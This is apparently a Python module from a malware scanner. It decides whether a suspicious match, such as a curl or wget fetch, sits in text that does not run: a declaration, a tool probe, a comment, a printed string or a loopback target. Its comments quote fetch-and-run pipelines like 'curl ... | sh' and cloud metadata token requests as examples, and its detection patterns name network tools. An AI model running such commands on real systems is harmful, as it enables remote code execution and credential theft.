"""Where a capability match sits in a file's text, and whether that place means it does not run.

A pattern hit is an observation about bytes. Whether those bytes are code that runs depends on where they
sit: a name being declared rather than called, a fetch that only probes for a tool, a command bound for
another machine, text inside a comment, a printed string, a quoted pipeline, a transcript line or prose.
These are the capability detector's answers to that question, kept apart from the labelling and the
composite reasoning that use them."""

from __future__ import annotations

import re
from typing import TYPE_CHECKING, ClassVar

from cordon_scanner.analysis.shared import embedded
from cordon_scanner.detect.code.capability.hits import CapabilityHit

if TYPE_CHECKING:
    from cordon_scanner.foundation.content import FileContent

EGRESS_TARGET = re.compile(
    rb"""(?ix)
    (?:https?|ftp|ws|wss)://          # a destination, written out
    (?:[^\s/@"'`\\]{1,120}@)?        # credentials in the URL, which are not the host
    \[?([A-Za-z0-9._:\-]{1,253})\]?   # the host, bracketed when it is an IPv6 literal
    """,
)
"""A written-out destination in a fetch. Only URLs: a variable cannot be judged."""

SCHEMELESS_TARGET = re.compile(
    rb"""(?ix)
    \b(?:curl|wget)[ \t]{1,8}
    (?:-{1,2}[A-Za-z][A-Za-z0-9-]{0,20}(?:[ \t]{1,8}[^\s-][^\s]{0,40})?[ \t]{1,8}){0,6}
    (                                   # and it has to LOOK like a host:
        (?: localhost
          | [A-Za-z0-9][A-Za-z0-9.-]{0,60}\.[A-Za-z]{2,24}   # a dotted name
          | [0-9]{1,3}(?:\.[0-9]{1,3}){3}                    # an IPv4 literal
        )
        (?::[0-9]{1,5})?
    )
    (?=[/ \t"']|$)
    # Without that the capture took the next token whatever it was, so
    # `curl -X POST localhost:8000/x` yielded `POST` as a second "host", nothing was
    # unanimously local, and the suppression silently stopped applying to exactly the
    # lines it was written for.
    """,
)
"""A fetch whose destination is written without a scheme.

`curl localhost:8000/v1/models` is how a CI script waits for the server it just
started, and vLLM writes it inside a `timeout 600 bash -c "until curl ...; do sleep
1; done"` loop. With only the URL pattern above, no host was found, nothing was
judged local, and the health check counted as reaching the network -- which with
`bash -c` on another line and `.buildkite/` for context produced
`MALWARE.DROPPER.001` at CRITICAL, fifteen times in one repository, about a script
that pulls the project's own image and runs its own test suite in it."""

QUOTED_TARGET = re.compile(
    rb"""(?ix)
    ["'`]
    (?: localhost
      | [0-9]{1,3}(?:\.[0-9]{1,3}){3}
      | ::1
      | [A-Za-z0-9][A-Za-z0-9.-]{0,60}\.[A-Za-z]{2,24}
    )
    (?::[0-9]{1,5})?
    ["'`]
    """,
)
"""A host written as a bare quoted string, with no scheme and no fetch tool in front.

`SCHEMELESS_TARGET` above only reads a `curl` or `wget` line. Every language that opens
a socket directly writes the host on its own: `pnpm` has
`TcpStream::connect(("127.0.0.1", port))` in its benchmark harness, and Go, Python and
Rust all spell it that way.

Adding a source of hosts can only make suppression harder, never easier: `_is_local_target`
requires EVERY host on the line to be local, so a line that quotes a real destination
keeps its capability because of this rather than in spite of it."""

LOCAL_EGRESS_TARGET = re.compile(
    rb"""(?ix)
    ^(?:
        localhost
      | 127\.[0-9.]{1,11}
      | 0\.0\.0\.0
      | ::1
      | 169\.254\.[0-9]{1,3}\.[0-9]{1,3}      # link-local, which every metadata service is
      | metadata\.google\.internal
      | [a-z0-9-]{1,60}\.localhost
    )(?::[0-9]{1,5})?$
    """,
)
"""Destinations that are not the network leaving the machine.

Loopback, and -- the one that prompted this -- the 169.254.0.0/16 link-local
range, which is where every cloud provider puts its instance metadata service.

Deliberately NOT the documentation names. `LOCAL_OR_RESERVED_HOST` in the secret
detector treats `example.com` and the RFC 6761 `.test` family as addresses nobody
authenticates to, which is right for a credential and wrong here: a fetch is a
fetch whatever it resolves to, this project's own malicious corpus is written
against `.test` hosts precisely because they resolve to nothing, and exempting
them would have turned every one of those samples into a false negative. A fetch
written against a documentation host in documentation is already ceilinged by
where it sits.

`stacksimplify/terraform-on-aws-eks` supplied fifteen copies of a fourteen-line
cloud-init script that installs Apache and writes the EC2 instance identity
document into the webroot:

    TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "..."`
    sudo curl -H "X-aws-ec2-metadata-token: $TOKEN" \
        http://169.254.169.254/latest/dynamic/instance-identity/document -o ...

Cordon read that as an outbound connection and produced both
`SUSPECT.PERSIST.001` -- "reaches the network and writes to a location that
survives a restart", the write being `systemctl enable httpd` -- and
`SUSPECT.EXFIL.001`. Neither claim was true: nothing left the instance.

The trade, stated: a payload that reaches a proxy on loopback, or reads metadata
credentials and posts them to 127.0.0.1 for something else to forward, loses this
capability here. That is accepted because the alternative is a capability whose
definition -- "opens an outbound network connection" -- is false for every file
that talks to its own metadata endpoint, and reading IMDS is how a very large
amount of ordinary cloud tooling finds out where it is running. A fetch that does
leave the host is still a fetch: the suppression is per match, so one local curl
beside one remote curl leaves the remote one intact.
"""


class TextPosition:
    """Questions about where in the text a capability match sits."""

    #: A call on an SSH session that takes a command: what it is given runs elsewhere.
    _REMOTE_CALL: ClassVar[re.Pattern[bytes]] = re.compile(
        rb"(?i)(?<![\w$])(?:ssh|sftp)[\w$]{0,24}\s{0,4}\.\s{0,4}"
        rb"(?:exec|execCommand|exec_command|run|shell|spawn)\s{0,4}\("
    )

    _REMOTE_SPAN_MAX: ClassVar[int] = 200_000

    @classmethod
    def off_this_machine(
        cls, content: FileContent, hits: list[CapabilityHit]
    ) -> list[CapabilityHit]:
        """Drop hits inside the arguments of a command sent to an SSH session.

        A deployment tool provisions a server by sending it a script -- install a runtime with
        `curl | bash`, write a systemd unit, enable it -- and every line of that script describes
        the other machine. Read as this file's own behaviour it is a dropper with persistence
        (review 98: a deployment library's server bootstrap). Not when the file binds the session's
        name to `child_process`: see `EmbeddedCommands.remote_session`.
        """
        raw = content.raw
        if not hits or not cls._REMOTE_CALL.search(raw):
            return hits
        spans: list[tuple[int, int]] = []
        for call in cls._REMOTE_CALL.finditer(raw):
            name = re.match(rb"[\w$]+", raw[call.start() : call.end()])
            if not name or not embedded.EmbeddedCommands.remote_session(
                content.text, name.group(0).decode("ascii", "replace")
            ):
                continue
            depth, j, end = 1, call.end(), min(len(raw), call.end() + cls._REMOTE_SPAN_MAX)
            while j < end and depth:
                c = raw[j]
                if c == 0x28:
                    depth += 1
                elif c == 0x29:
                    depth -= 1
                j += 1
            spans.append((call.start(), j))
        if not spans:
            return hits
        return [h for h in hits if not any(a <= h.byte_start < b for a, b in spans)]

    TOOL_PROBE = re.compile(
        rb"""(?ix)
        (?:
            # Asking whether the tool exists.
            (?:
                \b(?:which|type|hash|whence|where)[ \t]{1,4}
              | \bcommand[ \t]{1,4}-v[ \t]{1,4}
              | \bcompgen[ \t]{1,4}-c[ \t]{1,4}
            )
            (?:-{1,2}[A-Za-z-]{1,12}[ \t]{1,4}){0,2}
          | # Or naming it as a package to install, where it is a noun rather than a verb:
            # `apt-get install -y wget curl` is how a script ACQUIRES curl.
            \b(?:apt|apt-get|aptitude|yum|dnf|microdnf|zypper|apk|brew|pacman|choco)\b
            [^\n]{0,40}?\b(?:install|add|-S)\b[ \t]{1,4}
            (?:[-\w.=]{1,40}[ \t]{1,4}){0,8}
        )
        $
        """,
    )
    """Asking whether a tool exists, which is not using it.

    vLLM's `run-benchmarks.sh` opens with
    `(which wget && which curl) || (apt-get update && apt-get install -y wget curl)`,
    and the egress primitive matched the word `curl`. With `bash -c` on another line
    that was `MALWARE.DROPPER.001` at CRITICAL, and pm2's `setup.deb.sh` does the same
    thing with `if command -v curl > /dev/null`.

    Anchored at the end, so it is the text immediately before the match that decides:
    `which curl` is a probe and `curl https://x/y` one line later is still a fetch."""

    FETCH_COMMAND = re.compile(rb"(?i)\b(?:curl|wget|nc|scp|rsync|Invoke-WebRequest)\b")
    """The commands an egress pattern is looking for, so their position can be found.

    The shell egress patterns are anchored at the start of the line, with a
    comment-excluding prefix before the command name, which means the MATCH begins at
    the line start and says nothing about what sits
    immediately before the command. Rather than rewrite six patterns in the pack and
    lose their own comment guard, the commands are located again here."""

    DECLARATION = re.compile(
        rb"""(?ix)
        (?:
            \b(?:function|def|fn|sub|proc|method|interface|declare|class|impl)
            [ \t]{1,8}(?:\*[ \t]{0,4})?
            # `use` brings a name into scope and calls nothing. `zeroclaw` writes
            # `use reqwest::Client;`, `pnpm` writes `use reqwest::Url;`, and both were
            # reported as opening an outbound connection -- three findings across two
            # repositories whose whole content was an import line.
          | \buse[ \t]{1,8}
            # And whatever path sits between `use` and the name. The match is often the
            # LAST segment -- `use std::process::Command;` -- where everything before it
            # is the path rather than whitespace after the keyword.
            (?:[A-Za-z_][A-Za-z0-9_]{0,40}(?:::|\.)){0,8}
          | \b(?:async|export|public|private|protected|static|abstract|override)
            [ \t]{1,8}(?:function[ \t]{1,8})?
        )
        $
        """,
    )
    """The keywords that make what follows a definition rather than a call.

    `google/zx` exports a function called `fetch`, and the egress pattern matched it:
    `export function fetch(` was that repository's only blocking finding. Defining a
    name is not using the thing it is named after."""

    SIGNATURE_ARGUMENT = re.compile(
        rb"""(?x)
        \([ \t]{0,8}
        (?:
            [A-Za-z_$][\w$]{0,40}[ \t]{0,4}\?{0,1}[ \t]{0,4}:[ \t]{0,4}[A-Za-z_$\[(]
          | \)[ \t]{0,4}:[ \t]{0,4}[A-Za-z_$]
        )
        """,
    )
    """A typed parameter list, which only a declaration has.

    Tailwind's integration helpers declare
    `exec(command: string, options?: ChildProcessOptions): Promise<string>` on an
    interface. A call passes values; `name: Type` in the parentheses is a signature, and
    so is an empty list followed by a return type."""

    OPEN_PAREN_ONLY = re.compile(rb"^\([ \t]*(?://.*)?$")
    """An opening parenthesis that ends its line, so the parameters are below it."""

    CONTINUED_PARAMETER = re.compile(
        rb"""(?x)
        ^[ \t]{0,40}
        (?:(?:readonly|public|private|protected)[ \t]{1,8}){0,2}
        [A-Za-z_$][\w$]{0,40}[ \t]{0,4}\?{0,1}[ \t]{0,4}:[ \t]{0,4}[A-Za-z_$\[({]
        """,
    )
    """`name: Type` opening a line: a parameter in a signature laid out one to a line."""

    SIGNATURE_LOOKAHEAD = 3
    """How many lines below an open parenthesis to look for a typed parameter.

    Three. A signature that has not named a typed parameter within three lines of
    its parenthesis is not being recognised from its first line either."""

    @staticmethod
    def is_declaration(content: FileContent, offset: int, end: int) -> bool:
        """Whether this match is a name being DEFINED rather than called."""
        # The bytes just around the match, not its line: both patterns span a few hundred bytes,
        # and on a minified bundle the line is the file, copied once per match.
        line_number, (start, stop) = content.line_of(offset), content.line_bounds(offset)
        if TextPosition.DECLARATION.search(content.raw[max(start, offset - 512) : offset]):
            return True
        # From the match's LAST byte, which for these patterns is the opening
        # parenthesis -- `exec(` -- and the signature test needs to see it.
        at = max(offset, end - 1)
        tail = content.raw[at : min(stop, at + 256)]
        if TextPosition.SIGNATURE_ARGUMENT.match(tail) is not None:
            return True

        # A signature laid out one parameter to a line. The test above reads the
        # rest of THIS line, so a declaration whose parentheses open at the end of
        # it was invisible:
        #
        #     fetch(
        #         url: string,
        #         secretKey: string,
        #
        # That is `microsoft/vscode`, in the Copilot extension's
        # `ICompletionsFetchService` interface. `fetch(` was read as a network call
        # and `secretKey` as key material, and together they reported private key
        # material sent to the network at CRITICAL -- against a method signature,
        # twice, in the most widely installed editor there is.
        #
        # The defect is general rather than new: `exec(` opening a multi-line
        # signature was never suppressed either.
        if TextPosition.OPEN_PAREN_ONLY.match(tail.strip()) is None or (
            b"//" not in tail and content.raw[at + 256 : stop].strip()
        ):
            return False
        last = len(content.line_starts)
        stop = min(line_number + 1 + TextPosition.SIGNATURE_LOOKAHEAD, last + 1)
        for ahead in range(line_number + 1, stop):
            nxt = content.line_text(ahead).encode("utf-8", errors="replace").strip()
            if not nxt:
                continue
            return TextPosition.CONTINUED_PARAMETER.match(nxt) is not None
        return False

    @staticmethod
    def is_tool_probe(content: FileContent, offset: int) -> bool:
        """Whether every fetch command on this line is the argument of an existence test.

        `(which wget && which curl) || (apt-get install -y wget curl)` is the first line
        of vLLM's benchmark script, and pm2's installer writes
        `if command -v curl > /dev/null`. Asking whether a tool exists is not using it.

        EVERY occurrence has to be a probe, so `which curl && curl https://x/y | sh` --
        a probe and then the real thing on one line -- is not excused.
        """

        def answer() -> bool:
            line = content.line_text(content.line_of(offset)).encode("utf-8", errors="replace")
            commands = list(TextPosition.FETCH_COMMAND.finditer(line))
            if not commands:
                return False
            return all(
                TextPosition.TOOL_PROBE.search(line[: command.start()]) is not None
                for command in commands
            )

        return bool(content.once_per_line("tool_probe", offset, answer))

    @staticmethod
    def is_local_target(content: FileContent, offset: int) -> bool:
        """Whether every destination written beside this fetch stays on the machine.

        Judged from the line the match sits on, and from a written-out URL only: a
        fetch of `"$URL"` says nothing about where it goes, and a line naming no host
        at all is left alone. Suppression requires EVERY host on the line to be local,
        so a command that reads metadata and pipes it somewhere real keeps its
        capability.
        """

        def answer() -> bool:
            line = content.line_text(content.line_of(offset)).encode("utf-8", errors="replace")
            hosts = (
                EGRESS_TARGET.findall(line)
                + SCHEMELESS_TARGET.findall(line)
                # And hosts written as a bare quoted string. See `QUOTED_TARGET`.
                + [found.strip(b"\"'`") for found in QUOTED_TARGET.findall(line)]
            )
            # Trimmed, because a URL is often assembled out of shell quoting:
            # `"http://127.0.0.1:'"$port"'/health"` leaves the capture as `127.0.0.1:` with
            # the port on the other side of a quote, and an incomplete port is not a reason
            # to call a loopback address remote. vLLM writes that line in every integration
            # script it has.
            # From the RIGHT only. `::1` is a loopback address whose leading colons are the
            # address, and stripping both ends turned it into `1`, which the suite caught.
            trimmed = [host.rstrip(b":.'\"") for host in hosts]
            return bool(trimmed) and all(LOCAL_EGRESS_TARGET.match(host) for host in trimmed)

        return bool(content.once_per_line("local_target", offset, answer))

    #: Prose formats, by name: read by people and renderers, run by nothing.
    PROSE_SUFFIXES: ClassVar[tuple[str, ...]] = (
        ".md",
        ".markdown",
        ".mdx",
        ".rst",
        ".adoc",
        ".asciidoc",
        ".txt",
        ".org",
        ".textile",
    )

    PROSE_NAMES: ClassVar[tuple[str, ...]] = ("readme", "changelog", "contributing", "pkg-info")

    @staticmethod
    def is_prose(path: str) -> bool:
        name = path.rpartition("!")[2].rpartition("/")[2].lower()
        if name.endswith(TextPosition.PROSE_SUFFIXES):
            return True
        if name == "metadata" and ".dist-info/" in path.lower():
            return True
        stem = name.split(".", 1)[0]
        return stem in TextPosition.PROSE_NAMES and (
            "." not in name or name.endswith(TextPosition.PROSE_SUFFIXES)
        )

    #: Statements whose quoted argument is shown to somebody, not run.
    #:
    #: Make's three diagnostic functions, and the printing commands of every shell
    #: and language that appears in a build file. A capability matched inside the
    #: string one of these is given is a capability the file TALKS ABOUT.
    DIAGNOSTIC_STATEMENT = re.compile(
        rb"""(?ix)
        ^[ \t]*
        (?:
            [@-]{0,2}[ \t]*
            (?:echo|printf|print|puts|say|warn|
               console\.(?:log|info|warn|error)|
               write-host|write-output|write-warning)
          | \$\((?:warning|info|error)\b
        )
        """,
        re.VERBOSE | re.IGNORECASE,
    )

    #: A line of a doctest or an interactive transcript.
    #:
    #: `>>>` and `...` are Python's doctest prompts, `$` and `#` a shell transcript,
    #: `In [n]:` IPython's. A capability named on one of those lines is an ILLUSTRATION
    #: of an API: `aiohttp`'s own docstrings open a session in a doctest, `diffusers`
    #: fetches an image with `requests.get` in one, and both were read as code.
    #:
    #: The secrets detector has asked this question since its second release and this
    #: one did not, which is the same asymmetry the comment test had.
    EXAMPLE_PROMPT = re.compile(rb"^[ \t]*(?:>>>|\.\.\.|\$[ \t]|#[ \t]|In[ \t]\[\d+\]:)")

    @staticmethod
    def is_example_line(content: FileContent, offset: int) -> bool:
        """Whether this offset sits on a transcript line rather than on code."""
        opens, _ = content.line_bounds(offset)
        return TextPosition.EXAMPLE_PROMPT.match(content.raw[opens : opens + 4096]) is not None

    @staticmethod
    def is_comment(content: FileContent, offset: int, language: str | None) -> bool:
        """Whether this capability was named in a comment. See `core.comments`.

        Through the memo on `FileContent`, because every match on one line asks
        the same question of that line and the answer is a scan of it.
        """
        start = content.comment_column(content.line_of(offset), language)
        return start is not None and content.column_of(offset) - 1 >= start

    @staticmethod
    def is_printed_text(content: FileContent, start: int, end: int) -> bool:
        """Whether this match sits inside a string that is printed rather than run.

        The worst false positive found against real code, and the clearest. The
        Makefile in `spf13/cobra` - one of the most depended-upon Go libraries in
        existence - carries this:

            ifeq (, $(shell which golangci-lint))
            $(warning "could not find golangci-lint, run: curl -sfL https://... | sh")
            endif

        That is the text printed to a developer who is missing a tool. Cordon read
        the `curl ... | sh` inside it and reported MALWARE.DROPPER.001 at CRITICAL,
        in the MALICIOUS category, plus SUSPECT.DROPPER.001 on the same line. An
        accusation of that weight against a printed help message is not a tuning
        problem; it is the finding that ends the conversation about whether to adopt
        the tool.

        Install instructions embedded in diagnostics, READMEs and `echo` lines are
        everywhere, because `curl ... | sh` is how a great deal of software
        documents its own installation.

        TWO conditions, and the second is what keeps this from becoming a hole:

        The statement must be a printer, and the match must lie ENTIRELY inside its
        quoted argument. `echo "run: curl x | sh"` has the whole construct inside
        the quotes and is text. `echo "$(curl x)" | sh` pipes into a shell, so the
        `| sh` that makes it dangerous sits OUTSIDE the quotes and is not
        suppressed. The distinction is exactly the one that matters, and it falls
        out of the quote test rather than needing a second rule.
        """
        # The printer opens the line: asked of its first bytes before the line is copied.
        opens, _ = content.line_bounds(start)
        if not TextPosition.DIAGNOSTIC_STATEMENT.match(content.raw[opens : opens + 4096]):
            return False
        line_number = content.line_of(start)
        line = content.line_text(line_number)
        if not line:
            return False
        encoded = line.encode("utf-8", "surrogatepass")
        statement = TextPosition.DIAGNOSTIC_STATEMENT.match(encoded)
        if not statement:
            return False

        # Both ends inside the same quoted run. `column_of` is one-based, matching
        # how a finding reports a column.
        first = content.column_of(start) - 1
        last = content.column_of(end - 1) - 1
        opening = TextPosition._quote_depth(line, first)
        closing = TextPosition._quote_depth(line, last)
        if opening is None or opening != closing:
            return False

        # Quoted is not the same as inert. A shell runs `$(...)` and backticks
        # inside DOUBLE quotes, so `echo "$(curl -s https://host/s)" | sh` really
        # does fetch and execute -- the quotes are around the output, not around
        # the command. Suppressing the egress there would have taken one half of
        # the dropper composite away from a genuine fetch-and-run.
        #
        # Single quotes are inert in every shell, so a substitution inside them is
        # literal text and stays suppressed.
        # Scanned from the end of the diagnostic statement rather than the start of
        # the line, because `$(warning ...)` opens with `$(` itself. Make's
        # `warning`, `info` and `error` are FUNCTIONS, not command substitutions --
        # only `$(shell ...)` runs anything -- so counting that paren read every
        # Make diagnostic as executing its own message, which put the cobra
        # Makefile straight back to critical.
        return not (
            opening == '"' and TextPosition._inside_substitution(line, first, begin=statement.end())
        )

    @staticmethod
    def is_literal_backtick(content: FileContent, start: int) -> bool:
        """Whether a backtick at this offset is a character inside a single-quoted string.

        `getgrav/grav` uses the backtick as its `preg` delimiter and builds the pattern by
        concatenation: ``'`' . $token[0] . '([A-Za-z0-9+/]+={0,2})' . $token[1] . '`mu'``.
        Every backtick in it is a character in a single-quoted PHP string, and the spawn
        pattern read the pair as a command substitution -- with a `base64_decode` a line
        below, which made it a decode-and-execute finding.

        Single quotes only. In shell, `x="`ls`"` IS a substitution: double quotes
        interpolate and backticks inside them run. A single-quoted string does not, in
        shell or in PHP, which is why the test asks which quote rather than whether there
        is one.
        """
        if content.raw[start : start + 1] != b"`":
            return False
        line = content.line_text(content.line_of(start))
        if not line:
            return False
        column = content.column_of(start) - 1
        if column >= len(line) or line[column] != "`":
            return False
        return TextPosition._quote_depth(line, column) == "'"

    @staticmethod
    def is_quoted_pipeline(content: FileContent, start: int, end: int) -> bool:
        """Whether a fetch-and-run construct lies wholly inside a quoted string.

        `_is_printed_text` above requires a PRINTER in front of the quotes, which was
        the conservative first cut of this idea. The reasoning does not need one: a `|`
        inside quotes is not a pipeline, because the shell never sees it as one. What
        the string is then used for -- echoed, assigned, passed to a function -- does
        not change that.

        Measured on the third corpus pass, where `SUSPECT.DROPPER.001` became the
        largest remaining blocker at 39 repositories. A good part of it was software
        telling its user how to install something, in a string the printer test could
        not see:

            arg0="curl -fsSL https://code-server.dev/install.sh | sh -s --"
            check_prereq bun "Install: curl -fsSL https://bun.sh/install | bash"
            handle_error "curl is not installed but --with-ollama needs it"

        The first is a variable, the second an argument to the project's own helper,
        the third an error message. None is a pipeline.

        A SUBSTITUTION inside the quotes is still a substitution -- `"$(curl -s x)"`
        runs, which is why that check is shared with the printer path -- and the
        matched text itself must contain no `$(` or backtick, so a construct that
        reaches outside its own quotes is untouched. If the string is later handed to
        `eval`, the `eval` is its own execute capability and the composite still has
        both halves.
        """
        line_number = content.line_of(start)
        line = content.line_text(line_number)
        if not line:
            return False

        first = content.column_of(start) - 1
        last = content.column_of(end - 1) - 1
        opening = TextPosition._quote_depth(line, first)
        if opening is None or opening != TextPosition._quote_depth(line, last):
            return False

        matched = line[first : last + 1]
        if "$(" in matched or "`" in matched:
            return False
        return not (opening == '"' and TextPosition._inside_substitution(line, first))

    @staticmethod
    def _inside_substitution(line: str, offset: int, *, begin: int = 0) -> bool:
        """Whether `offset` sits inside a `$(...)` or a backtick pair on this line.

        Nesting counted for `$(`, since `$(dirname $(which x))` is ordinary.
        Backticks cannot nest without escaping, so they toggle.

        `begin` skips the construct that introduced the diagnostic, which in a
        Makefile is itself spelled `$(`.
        """
        depth = 0
        backtick = False
        index = begin
        while index < min(offset, len(line)):
            if line[index] == "\\":
                index += 2
                continue
            if line.startswith("$(", index):
                depth += 1
                index += 2
                continue
            if line[index] == ")" and depth:
                depth -= 1
            elif line[index] == "`":
                backtick = not backtick
            index += 1
        return depth > 0 or backtick

    @staticmethod
    def _quote_depth(line: str, offset: int) -> str | None:
        """Which quote character encloses `offset`, or None if it is unquoted.

        Single and double quotes tracked separately, because a shell treats them
        differently and an apostrophe inside a double-quoted message -- "couldn't
        find golangci-lint" -- must not read as opening a single-quoted string.
        Escaped quotes are skipped for the same reason.
        """
        quote: str | None = None
        index = 0
        while index < min(offset, len(line)):
            character = line[index]
            if character == "\\":
                index += 2
                continue
            if quote is None and character in "\"'":
                quote = character
            elif character == quote:
                quote = None
            index += 1
        return quote


__all__ = ["TextPosition"]
